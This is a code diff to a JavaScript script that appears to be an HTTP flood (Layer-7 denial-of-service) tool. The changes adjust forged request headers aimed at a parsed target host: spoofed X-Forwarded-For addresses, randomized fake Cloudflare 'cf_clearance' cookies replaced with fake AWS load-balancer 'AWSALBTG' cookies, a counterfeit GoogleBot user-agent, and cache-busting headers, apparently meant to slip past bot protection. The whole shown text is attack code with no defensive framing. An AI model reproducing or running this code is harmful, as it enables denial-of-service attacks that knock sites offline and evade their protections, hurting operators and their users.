@@ -970,7 +970,7 @@ const rateHeaders = [
   { "accept-language": lang },
   { "upgrade-insecure-requests": "1" },
   { "Access-Control-Request-Method": "GET" },
-  { "Cache-Control": "no-cache" },
+  { "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0" },
   { "Content-Encoding": "gzip, deflate, br" },
   { "content-type": "text/html" },
   { "cookie": randstr(15) },
@@ -1120,7 +1120,7 @@ headers["vary"] = randomHeaders['vary'];
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["TE"] = trailers;
 headers["set-cookie"] = randomHeaders['set-cookie'];
-headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)
+headers["cookie"] = "AWSALBTG=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)
 headers["Server"] = randomHeaders['Server'];
 headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
 headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
@@ -1150,7 +1150,8 @@ headers[":authority"] = parsedTarget.host;
 //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
-headers["cache-control"] = "no-cache";
+headers["cache-control"] = "no-cache, private, s-maxage=0";
+headers["cache-control"] = control;
 headers["X-Forwarded-For"] = spoofed;
 headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
 headers["sec-ch-ua-mobile"] = "?0";
@@ -1161,11 +1162,11 @@ headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
 headers["referer"] = Ref;
-headers["sec-fetch-mode"] = "navigate"; 
+headers["sec-fetch-mode"] = mode1; 
 headers["sec-fetch-dest"] = dest1;
 headers["sec-fetch-user"] = "?1";
 headers["TE"] = "trailers";
-headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
+headers["cookie"] = "AWSALBTG=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
 headers["sec-fetch-site"] = site1;
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["cf-cache-status"] = "BYPASS";
